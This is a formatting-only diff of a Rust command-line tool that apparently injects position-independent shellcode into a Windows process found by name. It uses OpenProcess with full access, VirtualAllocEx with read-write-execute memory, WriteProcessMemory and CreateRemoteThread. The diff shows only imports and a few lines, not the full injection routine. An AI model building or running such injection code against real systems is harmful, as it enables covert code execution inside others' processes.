@@ -1,9 +1,15 @@
-use std::{ptr::null_mut, mem::size_of};
 use clap::Parser;
+use std::{mem::size_of, ptr::null_mut};
 use windows_sys::Win32::{
     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
     System::{
-        Diagnostics::{Debug::WriteProcessMemory, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
+        Diagnostics::{
+            Debug::WriteProcessMemory,
+            ToolHelp::{
+                CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
+                TH32CS_SNAPPROCESS,
+            },
+        },
         Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
         Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
     },
@@ -28,7 +34,8 @@ fn main() {
     let process_name = &args.process;
     let file_path = args.file;
 
-    let process_id = get_process_id_by_name(process_name).expect("Failed to get process ID by name");
+    let process_id =
+        get_process_id_by_name(process_name).expect("Failed to get process ID by name");
     println!("[+] Process ID: {}", process_id);
 
     let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
@@ -129,7 +136,6 @@ fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
 
     return Ok(process_entry.th32ProcessID);
 }
-
 
 /// Converts a C null terminated String to a Rust String
 pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
